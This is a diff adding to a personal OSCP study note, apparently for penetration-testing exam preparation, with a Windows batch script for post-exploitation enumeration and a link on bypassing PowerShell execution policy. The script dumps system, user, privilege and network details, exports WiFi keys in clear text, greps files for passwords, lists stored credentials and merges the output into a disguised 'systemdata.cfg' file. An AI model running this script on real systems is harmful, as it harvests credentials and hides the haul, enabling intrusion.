@@ -1,6 +1,110 @@
 # my OSCP_note
 
 
+будет собирать следующую информацию:
+
+Имя хоста, информация об ОС, BIOS, физическое оборудование, последние исправления, локальные пользователи и группы, информация о локальных привилегиях, полная информация о сети (интерфейсы, стек IP v4 / v6, маршруты, активные соединения) Профили WiFi (имя профиля, SSID, соединение, шифрование , Pre-Shared Keys), Текущие запущенные процессы, доступная для записи информация о каталогах, профили локального брандмауэра, информация о локальном общем ресурсе, любые локально сохраненные строки с открытым текстом.
+
+```
+
+ECHO
+ECHO Creating TMP directory...
+CD\
+MD c:\TMP
+CD c:\TMP
+
+ECHO Gathering System Information...
+ECHO.
+ECHO System Information > asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+systeminfo >> asysteminfo.txt
+
+ECHO Gathering Recent Hotfix Information...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO Recent Hotfix Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+wmic qfe get Caption,Description,HotFixID,InstalledOn >> asysteminfo.txt
+
+ECHO Gathering Local Users and Groups Information...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO Local Users and Groups Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+net user >> asysteminfo.txt
+net localgroup >> asysteminfo.txt
+net group /domain >> asysteminfo.txt
+
+ECHO Gathering Local Priviledges...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO Local Priviledges Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+whoami /priv >> asysteminfo.txt
+
+ECHO Gathering Network Information...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO Network Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+ipconfig /all >> asysteminfo.txt
+route print >> asysteminfo.txt
+arp -A >> asysteminfo.txt
+netstat -ano >> asysteminfo.txt
+
+ECHO Gathering WiFi Information...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO WiFi Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+netsh wlan show profiles >> asysteminfo.txt
+netsh wlan export profile key=clear folder=C:\TMP
+
+ECHO Gathering Running Processes Information...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO Running Processes Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+tasklist /SVC >> asysteminfo.txt
+
+ECHO Gathering Writable Directory Information...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO Writable Directory Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+dir /a-r-d /s /b >> asysteminfo.txt
+
+ECHO Gathering Searchable Password Information...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO Searchable Password Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+findstr /spin "password" *.* > pbin.txt
+findstr /spin "passphrase" *.* > pbin.txt
+findstr /spin "pass" *.* >> pbin.txt
+findstr /spin "username" *.* >> pbin.txt
+findstr /spin "credentials" *.* >> pbin.txt
+
+ECHO Gathering Credential Information...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO Credential Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+cmdkey /list >> asysteminfo.txt
+
+ECHO Gathering Windows Firewall Information...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO Windows Firewall Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+Netsh Advfirewall show allprofiles >> asysteminfo.txt
+
+ECHO Gathering Local Share Information...
+ECHO ------------------------------------ >> asysteminfo.txt
+ECHO Local Share Information >> asysteminfo.txt
+ECHO ------------------------------------ >> asysteminfo.txt
+wmic share get /format:list >> asysteminfo.txt
+
+ECHO Merging File Sets...
+Copy c:\TMP\*.* c:\TMP\systemdata.cfg
+
+ECHO Deleting Unnessary File Sets...
+DEL c:\TMP\*.txt
+DEL c:\TMP\*.xml
+exit
+```
+
+
 #### bypass-the-powershell-execution-policy
 
 https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
